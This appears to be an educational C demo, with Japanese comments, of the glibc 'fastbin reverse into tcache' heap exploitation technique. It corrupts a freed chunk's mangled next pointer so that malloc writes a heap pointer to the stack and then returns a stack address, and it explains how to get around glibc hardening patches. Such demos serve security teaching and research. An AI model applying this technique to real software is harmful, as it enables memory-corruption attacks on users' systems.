#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	printf("\n"
		   "この攻撃は unsorted_bin_attack と似た効果を狙ったものですが、\n"
		   "小さい確保サイズ (allocsize <= 0x78) で動作します。\n"
		   "目標は、malloc(allocsize) の呼び出しによって\n"
		   "大きな符号なし値がスタックに書き込まれるように仕込むことです。\n\n");
	printf("パッチ https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41 の適用後は、\n"
		   "この攻撃を行うにはヒープアドレスのリーク (leak) が必要です。\n"
		   "同じパッチにより、tcache が返すチャンクが正しくアラインされることも保証されます。\n\n");
	printf("パッチ https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/ の適用後は、\n"
		   "確保させたい領域の手前の少なくとも 8 バイトを制御する必要があります(size を偽造するため)。\n\n");

	// 後で解放できるように 14 回確保します。
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	
	printf("まず、tcache を埋めるために、allocsize のチャンクを少なくとも 7 回 free する必要があります。\n"
	  	   "(7 回より多くても問題ありません。)\n\n");
	
	// tcache を埋めます。
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];
	printf("次に解放するポインタが、これから破壊するチャンクです: %p\n"
		   "破壊するのが今でも後でも構いません。tcache はすでに満杯なので、\n"
		   "このチャンクは fastbin に入ります。\n\n", victim);
	free(victim);
	
	printf("次に、さらに 1 個から 6 個のポインタを解放する必要があります。これらも\n"
		   "fastbin に入ります。スタック上のデータを制御できない場合は、\n"
		   "ちょうど 6 個のポインタを追加で解放する必要があります。そうしないと、\n"
		   "連結リストをたどるときにこの攻撃がセグメンテーション違反を起こします。\n"
		   "ただし、スタック上の少なくとも 8 バイトを制御でき、スタックの場所が分かっていて、\n"
		   "スタック上のさらに多くのデータを制御したい場合は、スタック上に mangle された NULL を\n"
		   "偽造してリストの走査を終了させることで、1 回の free で十分です。\n\n");
	
	// fastbin を埋めます。
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	// スタック上に配列を作り、ゴミ値で初期化します。
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	stack_var[1] = 0x51;

	printf("狙うスタックアドレス: %p\n"
		   "現在の値は %p です\n", &stack_var[2], (char*)stack_var[2]);
	
	printf("ここで、バッファオーバーフローや use-after-free などの脆弱性を使って、\n"
			"アドレス %p にある next ポインタを上書きします\n\n", victim);
	
	//------------脆弱性-----------
	
	// victim 内の連結リストのポインタを上書きします。
	// 次の操作は victim のアドレスが既知であることを前提としているため、
	// ヒープのリークが必要です。
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	//------------------------------------
	
	printf("次の手順は、tcache を空にするために malloc(allocsize) を 7 回呼ぶことです。\n\n");
	
	// tcache を空にします。
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	printf("ここで、スタック上の配列の内容を表示して、\n"
			"まだ変更されていないことを確認しましょう。\n\n");
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	printf("\n"
		   "次の確保で、スタックが上書きされます。tcache は空ですが、\n"
		   "fastbin は空ではないので、次の確保は fastbin から行われます。\n"
		   "また、fastbin の 7 個のチャンクが tcache の補充に使われます。\n"
		   "それら 7 個のチャンクは逆順で tcache にコピーされるため、狙っている\n"
		   "スタックアドレスは tcache の最初のチャンクになります。\n"
		   "そのチャンクにはリスト内の次のチャンクへのポインタが入っているため、\n"
		   "ヒープのポインタがスタックに書き込まれるのです。\n"
		   "\n"
		   "先ほど、fastbin に追加で解放するポインタが 6 個より少なくても\n"
		   "この攻撃は成立すると述べましたが、それはスタック上の値がゼロの場合に限ります。\n"
		   "スタック上の値は連結リストの next ポインタとして扱われるため、\n"
		   "有効なポインタでも null でもないとクラッシュするからです。\n"
		   "\n"
		   "スタック上の配列の内容は、現在次のようになっています:\n\n");
	
	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\n"
			"最後に、もう一度 malloc するとスタックアドレスが返ってきます: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
